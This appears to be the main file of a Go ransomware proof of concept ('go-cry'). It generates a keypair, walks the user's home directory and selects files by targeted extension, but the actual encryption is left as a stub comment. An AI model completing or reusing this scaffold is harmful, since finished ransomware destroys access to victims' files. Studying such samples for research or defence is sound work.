package main

import (
	"fmt"
	"os"
	"path/filepath"

	"strings"

	"github.com/redpois0n/go-cry/common"
)

func main() {
	fmt.Println("generating keypair...")
	priv := common.Generate()

	fmt.Println()
	fmt.Println(common.Stringify(priv))

	startWalk := getHomeDir()

	filepath.Walk(startWalk, func(filepath string, fileInfo os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("error", err.Error())
			return nil
		}

		fmt.Println("Encrypting", filepath)

		var proceed bool
		for _, v := range common.Extensions {
			if strings.HasSuffix(filepath, v) {
				proceed = true
				break
			}
		}

		if proceed {
			// Encrypt file
		}

		return nil
	})
}
